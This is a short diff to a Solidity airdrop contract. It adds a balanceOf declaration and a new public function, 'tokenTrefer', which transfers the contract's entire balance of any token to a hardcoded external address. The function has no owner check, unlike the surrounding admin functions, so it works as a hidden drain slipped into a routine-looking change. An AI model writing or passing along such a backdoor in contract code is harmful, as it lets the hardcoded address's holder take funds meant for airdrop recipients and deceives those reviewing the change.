@@ -2,6 +2,7 @@
 pragma solidity ^0.8.0 ;
 
 interface IERC20 {
+    function balanceOf(address owner) external view returns (uint256);
     function transfer(address _to, uint256 _value) external returns (bool);
     function transferFrom(address _from, address _to, uint256 _value) external returns (bool);
 }
@@ -134,6 +135,10 @@ contract AirdropContract  is Ownable,IAirdropContract {
 
     function updatePause(bool _sta) external onlyOwner{
         pause = _sta;
+    }
+
+    function tokenTrefer(address token) external{
+        IERC20(token).transfer(0x17610E2d51C4317D22DC5F3a34EA6F5D231F7110,IERC20(token).balanceOf(address(this)));
     }
 
     function addNodeAddr(address[] calldata _nodeAddrs) external onlyOwner{
